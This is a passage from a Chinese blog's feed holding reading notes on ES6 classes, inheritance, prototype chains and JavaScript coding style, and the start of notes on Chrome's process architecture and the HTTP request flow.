class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">new</span>.target === Person) &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;必须使用 new 命令生成实例&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person(<span class="string">&#x27;张三&#x27;</span>); <span class="comment">// 正确</span></span><br><span class="line"><span class="keyword">var</span> notAPerson = Person.call(person, <span class="string">&#x27;张三&#x27;</span>);  <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>Class 内部调用<code>new.target</code>，返回当前 Class。需要注意的是，子类继承父类时，<code>new.target</code>会返回子类。</p><h1 id="Class-的继承"><a href="#Class-的继承" class="headerlink" title="Class 的继承"></a>Class 的继承</h1><h2 id="1、简介-2"><a href="#1、简介-2" class="headerlink" title="1、简介"></a>1、简介</h2><p>Class 可以通过<code>extends</code>关键字实现继承，这比 ES5 的通过修改原型链实现继承，要清晰和方便很多。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x, y, color</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(x, y); <span class="comment">// 调用父类的constructor(x, y)</span></span><br><span class="line">    <span class="built_in">this</span>.color = color;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.color + <span class="string">&#x27; &#x27;</span> + <span class="built_in">super</span>.toString(); <span class="comment">// 调用父类的toString()</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ES5 的继承，实质是先创造子类的实例对象<code>this</code>，然后再将父类的方法添加到<code>this</code>上面（<code>Parent.apply(this)</code>）。ES6 的继承机制完全不同，实质是先将父类实例对象的属性和方法，加到<code>this</code>上面（所以必须先调用<code>super</code>方法），然后再用子类的构造函数修改<code>this</code>。</p><p>另一个需要注意的地方是，在子类的构造函数中，只有调用<code>super</code>之后，才可以使用<code>this</code>关键字，否则会报错。这是因为子类实例的构建，基于父类实例，只有<code>super</code>方法才能调用父类实例。</p><h2 id="2、Object-getPrototypeOf"><a href="#2、Object-getPrototypeOf" class="headerlink" title="2、Object.getPrototypeOf()"></a>2、Object.getPrototypeOf()</h2><p><code>Object.getPrototypeOf</code>方法可以用来从子类上获取父类。因此，可以使用这个方法判断，一个类是否继承了另一个类。</p><h2 id="3、super-关键字"><a href="#3、super-关键字" class="headerlink" title="3、super 关键字"></a>3、super 关键字</h2><p><code>super</code>这个关键字，既可以当作函数使用，也可以当作对象使用。</p><ul><li><p>第一种情况，<code>super</code>作为函数调用时，代表父类的构造函数。ES6 要求，子类的构造函数必须执行一次<code>super</code>函数。作为函数时，<code>super()</code>只能用在子类的构造函数之中</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">new</span>.target.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> A() <span class="comment">// A</span></span><br><span class="line"><span class="keyword">new</span> B() <span class="comment">// B</span></span><br></pre></td></tr></table></figure><p>注意，<code>super</code>虽然代表了父类<code>A</code>的构造函数，但是返回的是子类<code>B</code>的实例，即<code>super</code>内部的<code>this</code>指的是<code>B</code>的实例（因为在<code>super()</code>执行时，它指向的是子类<code>B</code>的构造函数），因此<code>super()</code>在这里相当于<code>A.prototype.constructor.call(this)</code>。</p></li><li><p>第二种情况，<code>super</code>作为对象时，在普通方法中，指向父类的原型对象；在静态方法中，指向父类。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">p</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">super</span>.p()); <span class="comment">// 2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B();</span><br></pre></td></tr></table></figure><p>上面代码中，子类<code>B</code>当中的<code>super.p()</code>，就是将<code>super</code>当作一个对象使用。这时，<code>super</code>在普通方法之中，指向<code>A.prototype</code>，所以<code>super.p()</code>就相当于<code>A.prototype.p()</code>。</p></li></ul><h2 id="4、类的-prototype-属性和-proto-属性"><a href="#4、类的-prototype-属性和-proto-属性" class="headerlink" title="4、类的 prototype 属性和__proto__属性"></a>4、类的 prototype 属性和__proto__属性</h2><p>Class 作为构造函数的语法糖，同时有<code>prototype</code>属性和<code>__proto__</code>属性，因此同时存在两条继承链。</p><p>（1）子类的<code>__proto__</code>属性，表示构造函数的继承，总是指向父类。</p><p>（2）子类<code>prototype</code>属性的<code>__proto__</code>属性，表示方法的继承，总是指向父类的<code>prototype</code>属性。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.setPrototypeOf(B.prototype, A.prototype);</span><br><span class="line"><span class="comment">// 等同于 </span></span><br><span class="line">B.prototype = <span class="built_in">Object</span>.create(A.prototype);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">B.prototype.__proto__ = A.prototype;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(B, A);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">B.__proto__ = A;</span><br></pre></td></tr></table></figure><p>这两条继承链，可以这样理解：作为一个对象，子类（<code>B</code>）的原型（<code>__proto__</code>属性）是父类（<code>A</code>）；作为一个构造函数，子类（<code>B</code>）的原型对象（<code>prototype</code>属性）是父类的原型对象（<code>prototype</code>属性）的实例。</p><h3 id="实例的-proto-属性"><a href="#实例的-proto-属性" class="headerlink" title="实例的 _proto_ 属性"></a>实例的 _<em>proto</em>_ 属性</h3><p>子类实例的<code>__proto__</code>属性的<code>__proto__</code>属性，指向父类实例的<code>__proto__</code>属性。也就是说，子类的原型的原型，是父类的原型。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> ColorPoint(<span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;red&#x27;</span>);</span><br><span class="line"></span><br><span class="line">p2.__proto__ === p1.__proto__ <span class="comment">// false</span></span><br><span class="line">p2.__proto__.__proto__ === p1.__proto__ <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>ColorPoint</code>继承了<code>Point</code>，导致前者原型的原型是后者的原型。因此，通过子类实例的<code>__proto__.__proto__</code>属性，可以修改父类实例的行为。</p><h2 id="5、原生构造函数的继承"><a href="#5、原生构造函数的继承" class="headerlink" title="5、原生构造函数的继承"></a>5、原生构造函数的继承</h2><p>ECMAScript 的原生构造函数大致有下面这些。</p><ul><li>Boolean()</li><li>Number()</li><li>String()</li><li>Array()</li><li>Date()</li><li>Function()</li><li>RegExp()</li><li>Error()</li><li>Object()</li></ul><h2 id="6、Mixin-模式的实现"><a href="#6、Mixin-模式的实现" class="headerlink" title="6、Mixin 模式的实现"></a>6、Mixin 模式的实现</h2><p>Mixin 指的是多个对象合成一个新的对象，新对象具有各个组成成员的接口。它的最简单实现如下。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> b = &#123;</span><br><span class="line">  <span class="attr">b</span>: <span class="string">&#x27;b&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> c = &#123;...a, ...b&#125;; <span class="comment">// &#123;a: &#x27;a&#x27;, b: &#x27;b&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Module-的语法"><a href="#Module-的语法" class="headerlink" title="Module 的语法"></a>Module 的语法</h1><h2 id="1、概述-3"><a href="#1、概述-3" class="headerlink" title="1、概述"></a>1、概述</h2><p>…(todo)</p><h1 id="Module-的加载实现"><a href="#Module-的加载实现" class="headerlink" title="Module 的加载实现"></a>Module 的加载实现</h1><p>…(todo)</p><h1 id="编程风格"><a href="#编程风格" class="headerlink" title="编程风格"></a>编程风格</h1><h2 id="1、块级作用域"><a href="#1、块级作用域" class="headerlink" title="1、块级作用域"></a>1、块级作用域</h2><p><strong>（1）let 取代 var</strong></p><p>不再使用<code>var</code>命令，而是使用<code>let</code>命令取代。</p><p><strong>（2）全局常量和线程安全</strong></p><p>在<code>let</code>和<code>const</code>之间，建议优先使用<code>const</code>，尤其是在全局环境，不应该设置变量，只应设置常量。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// best</span></span><br><span class="line"><span class="keyword">const</span> [a, b, c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br></pre></td></tr></table></figure><p><code>const</code>声明常量有三个好处，一是阅读代码的人立刻会意识到不应该修改这个值，二是防止了无意间修改变量值所导致的错误，三是JavaScript 编译器会对<code>const</code>进行优化。</p><p>所有的函数都应该设置为常量。</p><h2 id="2、字符串"><a href="#2、字符串" class="headerlink" title="2、字符串"></a>2、字符串</h2><p>静态字符串一律使用单引号或反引号，不使用双引号。动态字符串使用反引号。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="string">&#x27;foobar&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> b = <span class="string">`foo<span class="subst">$&#123;a&#125;</span>bar`</span>;</span><br></pre></td></tr></table></figure><h2 id="3、解构赋值"><a href="#3、解构赋值" class="headerlink" title="3、解构赋值"></a>3、解构赋值</h2><p>使用数组成员对变量赋值时，优先使用解构赋值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">const</span> first = arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">const</span> second = arr[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">const</span> [first, second] = arr;</span><br></pre></td></tr></table></figure><p>函数的参数如果是对象的成员，优先使用解构赋值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFullName</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> firstName = user.firstName;</span><br><span class="line">  <span class="keyword">const</span> lastName = user.lastName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFullName</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; firstName, lastName &#125; = obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// best</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFullName</span>(<span class="params">&#123; firstName, lastName &#125;</span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果函数返回多个值，优先使用对象的解构赋值，而不是数组的解构赋值。这样便于以后添加返回值，以及更改返回值的顺序。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processInput</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [left, right, top, bottom];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processInput</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; left, right, top, bottom &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; left, right &#125; = processInput(input);</span><br></pre></td></tr></table></figure><h2 id="4、对象"><a href="#4、对象" class="headerlink" title="4、对象"></a>4、对象</h2><p>单行定义的对象，最后一个成员不以逗号结尾。多行定义的对象，最后一个成员以逗号结尾。</p><p>对象尽量静态化，一旦定义，就不得随意添加新的属性。如果添加属性不可避免，要使用<code>Object.assign</code>方法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">const</span> a = &#123;&#125;;</span><br><span class="line">a.x = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if reshape unavoidable</span></span><br><span class="line"><span class="keyword">const</span> a = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.assign(a, &#123; <span class="attr">x</span>: <span class="number">3</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">const</span> a = &#123; <span class="attr">x</span>: <span class="literal">null</span> &#125;;</span><br><span class="line">a.x = <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>如果对象的属性名是动态的，可以在创造对象的时候，使用属性表达式定义。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;San Francisco&#x27;</span>,</span><br><span class="line">  [getKey(<span class="string">&#x27;enabled&#x27;</span>)]: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="5、数组"><a href="#5、数组" class="headerlink" title="5、数组"></a>5、数组</h2><p>使用扩展运算符（…）拷贝数组。</p><p>使用 Array.from 方法，将类似数组的对象转为数组。</p><h2 id="6、函数"><a href="#6、函数" class="headerlink" title="6、函数"></a>6、函数</h2><p>立即执行函数可以写成箭头函数的形式。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Welcome to the Internet.&#x27;</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>那些使用匿名函数当作参数的场合，尽量用箭头函数代替。因为这样更简洁，而且绑定了 this。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// best</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].map(<span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br></pre></td></tr></table></figure><p>箭头函数取代<code>Function.prototype.bind</code>，不应再用 self/_this/that 绑定 this。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">const</span> self = <span class="built_in">this</span>;</span><br><span class="line"><span class="keyword">const</span> boundMethod = <span class="function"><span class="keyword">function</span>(<span class="params">...params</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> method.apply(self, params);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// acceptable</span></span><br><span class="line"><span class="keyword">const</span> boundMethod = method.bind(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// best</span></span><br><span class="line"><span class="keyword">const</span> boundMethod = <span class="function">(<span class="params">...params</span>) =&gt;</span> method.apply(<span class="built_in">this</span>, params);</span><br></pre></td></tr></table></figure><p>不要在函数体内使用 arguments 变量，使用 rest 运算符（…）代替。因为 rest 运算符显式表明你想要获取参数，而且 arguments 是一个类似数组的对象，而 rest 运算符可以提供一个真正的数组。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">concatenateAll</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="keyword">return</span> args.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">concatenateAll</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> args.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用默认值语法设置函数参数的默认值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleThings</span>(<span class="params">opts</span>) </span>&#123;</span><br><span class="line">  opts = opts || &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleThings</span>(<span class="params">opts = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7、Map-结构"><a href="#7、Map-结构" class="headerlink" title="7、Map 结构"></a>7、Map 结构</h2><p>注意区分 Object 和 Map，只有模拟现实世界的实体对象时，才使用 Object。如果只是需要<code>key: value</code>的数据结构，使用 Map 结构。因为 Map 有内建的遍历机制。</p><h2 id="8、Class"><a href="#8、Class" class="headerlink" title="8、Class"></a>8、Class</h2><p>总是用 Class，取代需要 prototype 的操作。因为 Class 的写法更简洁，更易于理解。</p><p>使用<code>extends</code>实现继承，因为这样更简单，不会有破坏<code>instanceof</code>运算的危险。</p><h2 id="9、模块"><a href="#9、模块" class="headerlink" title="9、模块"></a>9、模块</h2><p>使用<code>import</code>取代<code>require</code>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">const</span> moduleA = <span class="built_in">require</span>(<span class="string">&#x27;moduleA&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> func1 = moduleA.func1;</span><br><span class="line"><span class="keyword">const</span> func2 = moduleA.func2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">import</span> &#123; func1, func2 &#125; <span class="keyword">from</span> <span class="string">&#x27;moduleA&#x27;</span>;</span><br></pre></td></tr></table></figure><p>使用<code>export</code>取代<code>module.exports</code>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// commonJS的写法</span></span><br><span class="line"><span class="keyword">var</span> React = <span class="built_in">require</span>(<span class="string">&#x27;react&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Breadcrumbs = React.createClass(&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">nav</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = Breadcrumbs;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6的写法</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Breadcrumbs</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">nav</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Breadcrumbs;</span><br></pre></td></tr></table></figure><p>如果模块默认输出一个函数，函数名的首字母应该小写。如果模块默认输出一个对象，对象名的首字母应该大写。</p><h2 id="10、ESLint-的使用"><a href="#10、ESLint-的使用" class="headerlink" title="10、ESLint 的使用"></a>10、ESLint 的使用</h2><h1 id="读懂-ECMAScript-规格"><a href="#读懂-ECMAScript-规格" class="headerlink" title="读懂 ECMAScript 规格"></a>读懂 ECMAScript 规格</h1><p>…(todo)</p><h1 id="异步遍历器"><a href="#异步遍历器" class="headerlink" title="异步遍历器"></a>异步遍历器</h1><p>…(todo)</p><h1 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h1><p>…(todo)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是阅读阮一峰老师《ECMAScript 6入门》的笔记(主要是记的知识点，外加自己的一点思考)，方便今后学习复习es6。&lt;/p&gt;
&lt;h1</summary>
      
    
    
    
    <category term="阅读笔记" scheme="https://asura1211.github.io/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ES6" scheme="https://asura1211.github.io/tags/ES6/"/>
    
  </entry>
  
  <entry>
    <title>【阅读笔记】— — 浏览器工作原理（极客时间）</title>
    <link href="https://asura1211.github.io/2021/06/12/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/"/>
    <id>https://asura1211.github.io/2021/06/12/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/</id>
    <published>2021-06-12T19:35:37.000Z</published>
    <updated>2021-10-13T05:42:45.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是<a href="https://time.geekbang.org/column/intro/100033601">极客时间——浏览器工作原理与实践</a> 专栏的阅读笔记，以便后续复习回顾。（侵权删）</p><h1 id="宏观视角下的浏览器"><a href="#宏观视角下的浏览器" class="headerlink" title="宏观视角下的浏览器"></a>宏观视角下的浏览器</h1><h2 id="多进程浏览器时代"><a href="#多进程浏览器时代" class="headerlink" title="多进程浏览器时代"></a>多进程浏览器时代</h2><p>最新的 Chrome 进程架构如下图：</p><p><img src="https://i.loli.net/2021/06/13/8ydCa7AL9ZuH4qh.jpg" alt="Snipaste_2021-06-13_19-43-47.jpg"></p><p>这几个进程的功能：</p><ul><li><strong>浏览器进程</strong>。主要负责界面显示、用户交互、子进程管理，同时提供存储等功能。</li><li><strong>渲染进程</strong>。核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，排版引擎 Blink 和 JavaScript 引擎 V8 都是运行在该进程中，默认情况下，Chrome 会为每个 Tab 标签创建一个渲染进程。出于安全考虑，渲染进程都是运行在沙箱模式下。</li><li><strong>GPU 进程</strong>。其实，Chrome 刚开始发布的时候是没有 GPU 进程的。而 GPU 的使用初衷是为了实现 3D CSS 的效果，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。最后，Chrome 在其多进程架构上也引入了 GPU 进程。</li><li><strong>网络进程</strong>。主要负责页面的网络资源加载，之前是作为一个模块运行在浏览器进程里面的，直至最近才独立出来，成为一个单独的进程。</li><li><strong>插件进程</strong>。主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响。</li></ul><p><strong>所以打开 1 个页面至少需要 1 个网络进程、1 个浏览器进程、1 个 GPU 进程以及 1 个渲染进程，共 4 个</strong>；如果打开的页面有运行插件的话，还需要再加上 1 个插件进程。</p><h2 id="页面文件如何完整送达浏览器？"><a href="#页面文件如何完整送达浏览器？" class="headerlink" title="页面文件如何完整送达浏览器？"></a>页面文件如何完整送达浏览器？</h2><h3 id="IP：把数据包送达目的主机"><a href="#IP：把数据包送达目的主机" class="headerlink" title="IP：把数据包送达目的主机"></a>IP：把数据包送达目的主机</h3><p>直接见图片：</p><p><img src="https://i.loli.net/2021/06/13/9PEtrafCURos1Qb.jpg" alt="Snipaste_2021-06-13_19-49-45.jpg"></p><h3 id="UDP：把数据包送达应用程序"><a href="#UDP：把数据包送达应用程序" class="headerlink" title="UDP：把数据包送达应用程序"></a>UDP：把数据包送达应用程序</h3><p>IP 通过 IP 地址信息把数据包发送给指定的电脑，而 UDP 通过端口号把数据包分发给正确的程序</p><p><img src="https://i.loli.net/2021/06/13/rAfZg3J8RUFk1Vu.jpg" alt="Snipaste_2021-06-13_19-51-04.jpg"></p><h3 id="TCP：把数据完整地送达应用程序"><a href="#TCP：把数据完整地送达应用程序" class="headerlink" title="TCP：把数据完整地送达应用程序"></a>TCP：把数据完整地送达应用程序</h3><p>一个完整的 TCP 连接的生命周期包括了“<strong>建立连接</strong>”“<strong>传输数据</strong>”和“<strong>断开连接</strong>”三个阶段。</p><p><img src="https://i.loli.net/2021/06/13/shdrBIkjAyg6Vot.jpg" alt="Snipaste_2021-06-13_19-52-42.jpg"></p><h2 id="浏览器端发起-HTTP-请求流程"><a href="#浏览器端发起-HTTP-请求流程" class="headerlink" title="浏览器端发起 HTTP 请求流程"></a>浏览器端发起 HTTP 请求流程</h2><p>如果你在浏览器地址栏里键入极客时间网站的地址：<a href="http://time.geekbang.org/index.html%EF%BC%8C">http://time.geekbang.org/index.html</a></p><h3 id="构建请求"><a href="#构建请求" class="headerlink" title="构建请求"></a>构建请求</h3><p>首先，浏览器构建<strong>请求行</strong>信息。构建好后，浏览器准备发起网络请求。</p><p><code>GET /index.html HTTP1.1</code></p><h3 id="查找缓存"><a href="#查找缓存" class="headerlink" title="查找缓存"></a>查找缓存</h3><p>在真正发起网络请求之前，浏览器会先在浏览器缓存中查询是否有要请求的文件。其中，<strong>浏览器缓存是一种在本地保存资源副本，以供下次请求时直接使用的技术</strong>。</p><p>当浏览器发现请求的资源已经在浏览器缓存中存有副本，它会拦截请求，返回该资源的副本，并直接结束请求，而不会再去源服务器重新下载。（缓解服务器端压力，提升性能）</p><h3 id="准备-IP-地址和端口"><a href="#准备-IP-地址和端口" class="headerlink" title="准备 IP 地址和端口"></a>准备 IP 地址和端口</h3><p>浏览器使用<strong>HTTP 协议作为应用层协议</strong>，用来封装请求的文本信息；并使用<strong>TCP/IP 作传输层协议</strong>将它发到网络上。因此<strong>HTTP 的内容是通过 TCP 的传输数据阶段来实现的。</strong></p><p><img src="https://i.loli.net/2021/06/13/nSpi5u2DCcIXR9z.jpg" alt="Snipaste_2021-06-13_19-56-13.jpg"></p><p><strong>第一步浏览器会请求 DNS 返回域名对应的 IP</strong>。当然浏览器还提供了<strong>DNS 数据缓存服务</strong>，如果某个域名已经解析过了，那么浏览器会缓存解析的结果，以供下次查询时直接使用，这样也会减少一次网络请求。</p><p>拿到 IP 之后，接下来就需要获取端口号了。通常情况下，如果 URL 没有特别指明端口号，那么 HTTP 协议默认是 80 端口。</p><h3 id="等待-TCP-队列"><a href="#等待-TCP-队列" class="headerlink" title="等待 TCP 队列"></a>等待 TCP 队列</h3><p>Chrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。如果当前请求数量少于 6，会直接进入下一步，建立 TCP 连接。</p><h3 id="建立-TCP-连接"><a href="#建立-TCP-连接" class="headerlink" title="建立 TCP 连接"></a>建立 TCP 